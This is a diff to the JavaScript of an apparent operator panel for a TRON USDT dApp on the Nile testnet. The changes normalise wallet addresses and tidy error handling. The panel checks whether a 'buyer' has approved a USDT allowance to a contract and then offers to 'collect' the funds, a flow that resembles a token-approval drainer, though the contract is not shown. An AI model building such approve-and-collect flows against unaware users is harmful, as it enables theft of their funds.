@@ -648,8 +648,16 @@
             document.getElementById('checkBtnText').innerHTML = '<div class="spinner"></div> Проверка...';
 
             try {
-                const approved = await contract.approved(user).call();
-                const collected = await contract.collected(user).call();
+                // Нормализуем адрес — TronLink иногда отдаёт hex вместо base58
+                let userNorm = user;
+                try {
+                    if (user.startsWith('0x') || user.startsWith('41')) {
+                        userNorm = tronWeb.address.fromHex(user.startsWith('0x') ? '41' + user.slice(2) : user);
+                    }
+                } catch(e) {}
+
+                const approved = await contract.approved(userNorm).call();
+                const collected = await contract.collected(userNorm).call();
 
                 document.getElementById('signStatus').innerHTML = approved 
                     ? '<span class="badge badge-success">✅ Подписано</span>'
@@ -662,17 +670,23 @@
                 // Проверяем allowance
                 try {
                     const usdtC = tronWeb.contract(USDT_ABI, usdt);
-                    const allowanceRaw = await usdtC.allowance(user, CONTRACT_ADDRESS).call();
-                    const allowanceNum = typeof allowanceRaw === 'object' ? allowanceRaw.toNumber ? allowanceRaw.toNumber() : Number(allowanceRaw) : Number(allowanceRaw);
+                    const allowanceRaw = await usdtC.allowance(userNorm, CONTRACT_ADDRESS).call();
+                    let allowanceNum = 0;
+                    try {
+                        allowanceNum = typeof allowanceRaw === 'object'
+                            ? (allowanceRaw._hex ? parseInt(allowanceRaw._hex, 16) : (allowanceRaw.toNumber ? allowanceRaw.toNumber() : Number(allowanceRaw)))
+                            : Number(allowanceRaw);
+                    } catch(e2) { allowanceNum = 0; }
                     const allowanceFmt = (allowanceNum / 1e6).toFixed(2);
                     document.getElementById('allowanceStatus').innerHTML = allowanceNum > 0
                         ? `<span class="badge badge-success">✅ ${allowanceFmt} USDT</span>`
                         : '<span class="badge badge-error">❌ Нет approve — попросите покупателя открыть buyer.html</span>';
                 } catch(e) {
+                    console.warn('allowance check error:', e);
                     document.getElementById('allowanceStatus').innerHTML = '<span class="badge badge-warning">⚠️ Не удалось проверить</span>';
                 }
 
-                const amount = await contract.checkCollectable(user, usdt).call();
+                const amount = await contract.checkCollectable(userNorm, usdt).call();
                 const amountFormatted = (amount / 1e6).toFixed(2);
 
                 document.getElementById('availableAmount').textContent = amountFormatted + ' USDT';
@@ -680,7 +694,7 @@
 
                 if (amount > 0 && !collected && approved) {
                     document.getElementById('collectSection').style.display = 'block';
-                    currentUserData = { user, usdt, amount: amountFormatted };
+                    currentUserData = { user: userNorm, usdt, amount: amountFormatted };
                 } else {
                     document.getElementById('collectSection').style.display = 'none';
 
@@ -696,9 +710,9 @@
 
             } catch (error) {
                 console.error(error);
-                let msg = error.message || 'Ошибка проверки';
+                let msg = error.message || String(error) || 'Ошибка проверки';
                 if (msg.includes('REVERT')) msg = 'Ошибка контракта: возможно, адрес невалиден или не существует';
-                if (msg.includes('Invalid address')) msg = 'Некорректный адрес';
+                if (msg.includes('Invalid address') || msg.includes('Некорректный адрес')) msg = 'Некорректный адрес — убедитесь что сеть TronLink = Nile Testnet';
                 alert(msg);
             } finally {
                 checkBtn.disabled = false;
